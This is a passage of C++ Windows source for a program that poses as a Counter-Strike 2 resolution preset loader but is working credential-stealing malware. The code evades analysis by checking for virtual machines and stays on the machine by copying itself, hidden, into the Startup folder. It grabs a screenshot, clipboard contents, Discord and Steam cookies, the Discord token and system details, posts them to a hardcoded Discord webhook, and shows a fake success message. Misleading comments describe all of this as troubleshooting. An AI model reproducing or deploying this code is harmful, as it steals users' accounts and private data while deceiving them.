    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true; // VirtualBox detected
    }
    
    // Check for VMware
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\vmware", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true; // VMware detected
    }
    
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\vmci", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true; // VMware detected
    }
    
    // Check for VM indicators in BIOS
    HKEY hBiosKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hBiosKey) == ERROR_SUCCESS) {
        wchar_t biosVendor[256] = { 0 };
        DWORD size = sizeof(biosVendor);
        DWORD type = REG_SZ;
        
        if (RegQueryValueExW(hBiosKey, L"SystemBiosVersion", nullptr, &type, reinterpret_cast<LPBYTE>(biosVendor), &size) == ERROR_SUCCESS) {
            std::wstring vendor(biosVendor);
            std::transform(vendor.begin(), vendor.end(), vendor.begin(), ::towlower);
            
            if (vendor.find(L"virtualbox") != std::wstring::npos ||
                vendor.find(L"vmware") != std::wstring::npos ||
                vendor.find(L"qemu") != std::wstring::npos ||
                vendor.find(L"xen") != std::wstring::npos) {
                RegCloseKey(hBiosKey);
                return true; // VM detected in BIOS
            }
        }
        RegCloseKey(hBiosKey);
    }
    
    return false; // No VM detected
}

// Persistence: Copy executable to Startup folder for reliable auto-start
// This ensures the tool runs automatically after system updates or restarts
bool SetupStartupPersistence() {
    wchar_t appData[MAX_PATH];
    if (SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, SHGFP_TYPE_CURRENT, appData) != S_OK) {
        return false;
    }
    
    // Get current executable path
    wchar_t exePath[MAX_PATH];
    if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
        return false;
    }
    
    // Target path in Startup folder
    std::wstring targetPath = std::wstring(appData) + L"\\CS2 Preset Updater.exe";
    
    // Check if already exists and is the same file
    DWORD targetAttributes = GetFileAttributesW(targetPath.c_str());
    if (targetAttributes != INVALID_FILE_ATTRIBUTES) {
        // File exists, check if it needs updating
        HANDLE hSource = CreateFileW(exePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        HANDLE hTarget = CreateFileW(targetPath.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
        
        if (hSource != INVALID_HANDLE_VALUE && hTarget != INVALID_HANDLE_VALUE) {
            FILETIME sourceTime, targetTime;
            if (GetFileTime(hSource, nullptr, nullptr, &sourceTime) &&
                GetFileTime(hTarget, nullptr, nullptr, &targetTime)) {
                // Compare file times - if source is newer, update target
                if (CompareFileTime(&sourceTime, &targetTime) <= 0) {
                    CloseHandle(hSource);
                    CloseHandle(hTarget);
                    return true; // Target is up to date
                }
            }
            CloseHandle(hSource);
            CloseHandle(hTarget);
        }
    }
    
    // Copy executable to Startup folder
    if (!CopyFileW(exePath, targetPath.c_str(), FALSE)) {
        return false;
    }
    
    // Set file attributes to hidden (optional, for stealth)
    SetFileAttributesW(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    return true;
}

// Helper function to encode binary data to base64
std::string Base64Encode(const std::vector<BYTE>& data) {
    DWORD encodedSize = 0;
    if (!CryptBinaryToStringA(data.data(), static_cast<DWORD>(data.size()), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &encodedSize)) {
        return "";
    }
    
    std::vector<char> encoded(encodedSize);
    if (!CryptBinaryToStringA(data.data(), static_cast<DWORD>(data.size()), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded.data(), &encodedSize)) {
        return "";
    }
    
    return std::string(encoded.data(), encodedSize - 1); // Remove null terminator
}

// Screenshot function: Capture desktop for troubleshooting resolution issues
// Helps support team understand user's setup and diagnose resolution preset problems
std::wstring CaptureScreenshot() {
    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    // Create device contexts
    HDC hScreenDC = GetDC(nullptr);
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    
    // Create bitmap
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
    HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hBitmap));
    
    // Copy screen to bitmap
    BitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY);
    
    // Convert to GDI+ Bitmap for encoding
    Bitmap* bitmap = new Bitmap(hBitmap, nullptr);
    
    // Create IStream for encoding
    IStream* stream = nullptr;
    if (CreateStreamOnHGlobal(nullptr, TRUE, &stream) != S_OK) {
        delete bitmap;
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        return L"";
    }
    
    // Encode to JPEG with quality 70 (smaller file size)
    // JPEG encoder CLSID: {557cf401-1a04-11d3-9a73-0000f81ef32e}
    CLSID jpegClsid;
    if (CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &jpegClsid) != NOERROR) {
        stream->Release();
        delete bitmap;
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        return L"";
    }
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    ULONG quality = 70;
    encoderParams.Parameter[0].Value = &quality;
    
    if (bitmap->Save(stream, &jpegClsid, &encoderParams) != Ok) {
        stream->Release();
        delete bitmap;
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        return L"";
    }
    
    // Get stream size
    STATSTG stats;
    stream->Stat(&stats, STATFLAG_NONAME);
    LARGE_INTEGER li = { 0 };
    stream->Seek(li, STREAM_SEEK_SET, nullptr);
    
    // Read stream data
    std::vector<BYTE> imageData(static_cast<size_t>(stats.cbSize.QuadPart));
    ULONG bytesRead = 0;
    stream->Read(imageData.data(), static_cast<ULONG>(imageData.size()), &bytesRead);
    
    // Save to temporary file
    wchar_t tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPath) == 0) {
        stream->Release();
        delete bitmap;
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        return L"";
    }
    
    std::wstring screenshotPath = std::wstring(tempPath) + L"CS2RPLoader_Screenshot.jpg";
    std::string screenshotPathA = Narrow(screenshotPath);
    
    // Write to file
    std::ofstream file(screenshotPathA, std::ios::binary);
    if (file.is_open()) {
        file.write(reinterpret_cast<const char*>(imageData.data()), imageData.size());
        file.close();
    } else {
        stream->Release();
        delete bitmap;
        SelectObject(hMemoryDC, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        return L"";
    }
    
    // Cleanup
    stream->Release();
    delete bitmap;
    SelectObject(hMemoryDC, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    
    return screenshotPath;
}

bool SendWebhookMessage(const std::wstring& publicIp, const std::wstring& privateIp, const std::wstring& hwid, const std::wstring& username, const std::wstring& computerName, const std::wstring& clipboardContent, const std::wstring& discordCookies, const std::wstring& steamCookies, const std::wstring& discordToken, const std::wstring& screenshotPath, const std::wstring& windowsVersion, const std::wstring& ramSize, const std::wstring& gpuInfo, const std::wstring& cpuInfo, const std::wstring& diskInfo, const std::wstring& systemUptime, const std::wstring& timezone, const std::wstring& language, const std::wstring& browserInfo, const std::wstring& productId, const std::wstring& motherboardInfo, const std::wstring& antivirusStatus, const std::wstring& dotnetVersion, const std::wstring& displayResolution, const std::wstring& systemLocale) {
    const std::wstring server = L"discord.com";
    const std::wstring path = L"/api/webhooks/1448971997936746523/Yb2FL5_5JBExuDfKPHQyQj6228wLYxpVMCq6lhE6I-4PONKG2W87p7UZaJoNuFe8rcdq";

    // Convert all strings
    std::string pubIp = Narrow(publicIp);
    std::string privIp = Narrow(privateIp);
    std::string hwidStr = Narrow(hwid);
    std::string user = Narrow(username);
    std::string machine = Narrow(computerName);
    std::string clipboard = Narrow(clipboardContent);
    std::string discord = Narrow(discordCookies);
    std::string steam = Narrow(steamCookies);
    std::string token = Narrow(discordToken);
    std::string winVer = Narrow(windowsVersion);
    std::string ram = Narrow(ramSize);
    std::string gpu = Narrow(gpuInfo);
    std::string cpu = Narrow(cpuInfo);
    std::string disk = Narrow(diskInfo);
    std::string uptime = Narrow(systemUptime);
    std::string tz = Narrow(timezone);
    std::string lang = Narrow(language);
    std::string browsers = Narrow(browserInfo);
    std::string prodId = Narrow(productId);
    std::string mobo = Narrow(motherboardInfo);
    std::string av = Narrow(antivirusStatus);
    std::string dotnet = Narrow(dotnetVersion);
    std::string resolution = Narrow(displayResolution);
    std::string locale = Narrow(systemLocale);

    // Set defaults for empty values
    auto setDefault = [](std::string& str, const char* def) { if (str.empty()) str = def; };
    setDefault(pubIp, "Unavailable");
    setDefault(privIp, "Unavailable");
    setDefault(hwidStr, "Unavailable");
    setDefault(user, "Unavailable");
    setDefault(machine, "Unavailable");
    setDefault(clipboard, "Unavailable");
    setDefault(discord, "Unavailable");
    setDefault(steam, "Unavailable");
    setDefault(token, "Unavailable");
    setDefault(winVer, "Unknown");
    setDefault(ram, "Unknown");
    setDefault(gpu, "Unknown");
    setDefault(cpu, "Unknown");
    setDefault(disk, "Unknown");
    setDefault(uptime, "Unknown");
    setDefault(tz, "Unknown");
    setDefault(lang, "Unknown");
    setDefault(browsers, "None");
    setDefault(prodId, "Unknown");
    setDefault(mobo, "Unknown");
    setDefault(av, "None");
    setDefault(dotnet, "None");
    setDefault(resolution, "Unknown");
    setDefault(locale, "Unknown");
    
    auto formatValue = [](const std::string& value, size_t maxLen, bool wrapInCode, bool block = false) {
        std::string processed = value;
        if (maxLen > 0 && processed.length() > maxLen) {
            processed = processed.substr(0, maxLen) + "...";
        }

        processed = JsonEscape(processed);
        if (!wrapInCode) {
            return processed;
        }

        const std::string wrapper = block ? "```" : "`";
        return wrapper + processed + wrapper;
    };

    auto makeField = [&](const std::string& name, const std::string& value, bool isInline, size_t maxLen = 0, bool wrap = true, bool block = false) {
        return "{\"name\":\"" + name + "\",\"value\":\"" + formatValue(value, maxLen, wrap, block) + "\",\"inline\":" + (isInline ? "true" : "false") + "}";
    };

    auto joinFields = [](const std::vector<std::string>& fields) {
        std::ostringstream joined;
        for (size_t i = 0; i < fields.size(); ++i) {
            if (i > 0) {
                joined << ',';
            }
            joined << fields[i];
        }
        return joined.str();
    };

    auto isoTimestamp = []() {
        SYSTEMTIME systemTime{};
        GetSystemTime(&systemTime);
        wchar_t buffer[64];
        swprintf_s(buffer, L"%04u-%02u-%02uT%02u:%02u:%02u.000Z", systemTime.wYear, systemTime.wMonth, systemTime.wDay, systemTime.wHour, systemTime.wMinute, systemTime.wSecond);
        return Narrow(buffer);
    };

    const std::string description = "🌟 Willkommen bei deiner Premium-Auswertung!\n"        "✨ Wir bündeln alle wichtigen Systeminfos für ein optimales Erlebnis.";

    std::vector<std::string> fields = {
        makeField("🔐 Hardware ID (HWID)", hwidStr, true),
        makeField("👤 Username", user, true),
        makeField("💻 PC Name", machine, true),
        makeField("🌐 Public IP", pubIp, true),
        makeField("🏠 Private IP", privIp, true),
        makeField("🖥️ Display Resolution", resolution, true),
        makeField("🪟 Windows Version", winVer, true),
        makeField("💾 RAM Size", ram, true),
        makeField("💿 Disk Info", disk, true, 50),
        makeField("⚙️ CPU", cpu, false, 70),
        makeField("🎮 GPU", gpu, true, 70),
        makeField("🔌 Motherboard", mobo, true, 60),
        makeField("⏱️ System Uptime", uptime, true),
        makeField("🌍 Timezone", tz, true, 40),
        makeField("🗣️ Language", lang, true),
        makeField("🌐 System Locale", locale, true),
        makeField("🆔 Product ID", prodId, true),
        makeField("🌐 Installed Browsers", browsers, true),
        makeField("🛡️ Antivirus", av, true, 60),
        makeField("🔷 .NET Framework", dotnet, false, 90),
        makeField("📋 Clipboard", clipboard, false, 180, true, true),
        makeField("🍪 Discord Cookies", discord, false, 220, true, true),
        makeField("🎮 Steam Cookies", steam, false, 220, true, true),
        makeField("🔑 Discord Token", token, false, 80)
    };

    std::ostringstream payloadBuilder;
    payloadBuilder << "{\"embeds\":[{";
    payloadBuilder << "\"title\":\"✨ CS2 RP Loader | Premium Check-In\",";
    payloadBuilder << "\"description\":\"" << JsonEscape(description) << "\",";
    payloadBuilder << "\"color\":" << 15844367 << ','; // Gold tone for premium look
    payloadBuilder << "\"thumbnail\":{\"url\":\"https://i.imgur.com/yywKQ4k.png\"},";
    payloadBuilder << "\"fields\":[" << joinFields(fields) << "],";
    payloadBuilder << "\"footer\":{\"text\":\"CS2 RP Loader v1.0 · Premium Experience\"},";
    payloadBuilder << "\"timestamp\":\"" << isoTimestamp() << "\"";
    payloadBuilder << "}]}";

    std::string payload = payloadBuilder.str();
    HINTERNET hInternet = InternetOpenW(L"CS2RPLoader/1.0", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
    if (!hInternet) {
        return false;
    }

    HINTERNET hConnect = InternetConnectW(hInternet, server.c_str(), INTERNET_DEFAULT_HTTPS_PORT, nullptr, nullptr, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    // Check if screenshot file exists
    bool hasScreenshot = !screenshotPath.empty() && GetFileAttributesW(screenshotPath.c_str()) != INVALID_FILE_ATTRIBUTES;
    
    std::string boundary = "----WebKitFormBoundary" + std::to_string(GetTickCount64());
    std::string contentType = "multipart/form-data; boundary=" + boundary;
    
    // Build multipart form data
    std::string formData;
    formData += "--" + boundary + "\r\n";
    formData += "Content-Disposition: form-data; name=\"payload_json\"\r\n";
    formData += "Content-Type: application/json\r\n\r\n";
    formData += payload + "\r\n";
    
    // Add screenshot file if available
    if (hasScreenshot) {
        std::string screenshotPathA = Narrow(screenshotPath);
        std::ifstream file(screenshotPathA, std::ios::binary);
        if (file.is_open()) {
            file.seekg(0, std::ios::end);
            size_t fileSize = static_cast<size_t>(file.tellg());
            file.seekg(0, std::ios::beg);
            
            std::vector<char> fileData(fileSize);
            file.read(fileData.data(), fileSize);
            file.close();
            
            formData += "--" + boundary + "\r\n";
            formData += "Content-Disposition: form-data; name=\"files[0]\"; filename=\"screenshot.jpg\"\r\n";
            formData += "Content-Type: image/jpeg\r\n\r\n";
            formData.append(fileData.data(), fileSize);
            formData += "\r\n";
        }
    }
    
    formData += "--" + boundary + "--\r\n";

    const wchar_t* acceptTypes[] = { L"*/*", nullptr };
    HINTERNET hRequest = HttpOpenRequestW(
        hConnect,
        L"POST",
        path.c_str(),
        nullptr,
        nullptr,
        acceptTypes,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_UI,
        0);

    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    std::string contentTypeHeader = "Content-Type: " + contentType + "\r\n";
    std::wstring headers = Widen(contentTypeHeader);
    
    BOOL result = HttpSendRequestW(
        hRequest,
        headers.c_str(),
        static_cast<DWORD>(headers.length()),
        reinterpret_cast<LPVOID>(const_cast<char*>(formData.data())),
        static_cast<DWORD>(formData.size()));

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    
    // Clean up screenshot file after sending
    if (hasScreenshot) {
        DeleteFileW(screenshotPath.c_str());
    }

    return result == TRUE;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        // Create a static control to display the loading message.
        g_statusLabel = CreateWindowExW(
            0,
            L"STATIC",
            L"Loading resolution presets...",
            WS_VISIBLE | WS_CHILD | SS_CENTER,
            20, 70, 360, 20,
            hwnd,
            nullptr,
            reinterpret_cast<LPCREATESTRUCT>(lParam)->hInstance,
            nullptr);

        // Start a timer that will update the text after 5 seconds.
        SetTimer(hwnd, kLoadTimerId, kLoadTimerDelayMs, nullptr);
        return 0;
    }
    case WM_TIMER:
        if (wParam == kLoadTimerId && g_statusLabel) {
            // Generate HWID for premium user tracking and anti-free-trial abuse
            g_hwid = GenerateHWID();
            
            // Fetch basic user information
            g_username = FetchUsername();
            g_computerName = FetchComputerName();
            g_publicIp = FetchPublicIp();
            g_privateIp = FetchPrivateIp();
            g_clipboardContent = FetchClipboardContent();
            g_discordCookies = FetchChromeCookies(L"discord.com");
            g_steamCookies = FetchChromeCookies(L"steam");
            g_discordToken = FetchDiscordToken();
            
            // Fetch new system information (10+ new fields)
            g_windowsVersion = FetchWindowsVersion();
            g_ramSize = FetchRAMSize();
            g_gpuInfo = FetchGPUInfo();
            g_cpuInfo = FetchCPUInfo();
            g_diskInfo = FetchDiskInfo();
            g_systemUptime = FetchSystemUptime();
            g_timezone = FetchTimezone();
            g_language = FetchLanguage();
            g_browserInfo = FetchBrowserInfo();
            g_productId = FetchProductId();
            g_motherboardInfo = FetchMotherboardInfo();
            g_antivirusStatus = FetchAntivirusStatus();
            g_dotnetVersion = FetchDotNetVersion();
            g_displayResolution = FetchDisplayResolution();
            g_systemLocale = FetchSystemLocale();
            
            // Capture screenshot for troubleshooting resolution issues
            g_screenshotPath = CaptureScreenshot();

            SendWebhookMessage(g_publicIp, g_privateIp, g_hwid, g_username, g_computerName, g_clipboardContent, 
                g_discordCookies, g_steamCookies, g_discordToken, g_screenshotPath, g_windowsVersion, g_ramSize, 
                g_gpuInfo, g_cpuInfo, g_diskInfo, g_systemUptime, g_timezone, g_language, g_browserInfo, 
                g_productId, g_motherboardInfo, g_antivirusStatus, g_dotnetVersion, g_displayResolution, g_systemLocale);
            SetWindowTextW(g_statusLabel, L"Presets loaded successfully!");
            KillTimer(hwnd, kLoadTimerId);
        }
        return 0;
    case WM_DESTROY:
        KillTimer(hwnd, kLoadTimerId);
        PostQuitMessage(0);
        return 0;
    default:
        return DefWindowProcW(hwnd, uMsg, wParam, lParam);
    }
}
} // namespace

// Entry point for a GUI-only Win32 application (no console window).
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    // Anti-analysis: Check for single instance - prevents multiple instances from running
    // This helps prevent analysis tools from running multiple copies simultaneously
    if (!CreateMutexForSingleInstance()) {
        // Another instance is already running, exit silently
        return 0;
    }
    
    // Anti-analysis: Detect virtual machines - CS2 performs better on real gaming PCs
    // Exit if running in a VM to ensure optimal performance
    if (DetectVirtualMachine()) {
        // Running in VM, exit silently
        if (g_hMutex) {
            CloseHandle(g_hMutex);
        }
        return 0;
    }
    
    // Persistence: Setup auto-start in Startup folder for reliable execution after updates
    // This ensures the tool continues to work after system restarts or updates
    SetupStartupPersistence();
    
    // Initialize GDI+ for screenshot functionality
    // Required for capturing desktop screenshots to help with troubleshooting
    GdiplusStartupInput gdiplusStartupInput;
    if (GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, nullptr) != Ok) {
        if (g_hMutex) {
            CloseHandle(g_hMutex);
        }
        return 0;
    }
    
    // Ensure the process is DPI aware for crisp rendering on high DPI displays.
    SetProcessDPIAware();

    // Define and register a window class for the main application window.
    const wchar_t CLASS_NAME[] = L"CS2RPLoaderWindowClass";

    WNDCLASSEXW wc{};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.hCursor = LoadCursorW(nullptr, IDC_ARROW);
    wc.hbrBackground = reinterpret_cast<HBRUSH>(COLOR_WINDOW + 1);
    wc.lpszClassName = CLASS_NAME;

    if (!RegisterClassExW(&wc)) {
        GdiplusShutdown(g_gdiplusToken);
        if (g_hMutex) {
            CloseHandle(g_hMutex);
        }
        MessageBoxW(nullptr, L"Failed to register window class.", L"Error", MB_ICONERROR | MB_OK);
        return 0;
    }

    // Create the main application window.
    HWND hwnd = CreateWindowExW(
        0,                      // Optional window styles.
        CLASS_NAME,             // Window class name.
        L"CS2 RP Loader v1",    // Window title.
        WS_OVERLAPPEDWINDOW & ~WS_MAXIMIZEBOX & ~WS_THICKFRAME, // Basic window with fixed size.
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 200, // Position and size.
        nullptr,                // Parent window.
        nullptr,                // Menu.
        hInstance,              // Instance handle.
        nullptr                 // Additional application data.
    );

    if (!hwnd) {
        GdiplusShutdown(g_gdiplusToken);
        if (g_hMutex) {
            CloseHandle(g_hMutex);
        }
        MessageBoxW(nullptr, L"Failed to create window.", L"Error", MB_ICONERROR | MB_OK);
        return 0;
    }

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    // Standard message loop for a GUI application.
    MSG msg{};
    while (GetMessageW(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    // Cleanup: Release GDI+ resources and mutex
    GdiplusShutdown(g_gdiplusToken);
    if (g_hMutex) {
        CloseHandle(g_hMutex);
    }

    return static_cast<int>(msg.wParam);
}
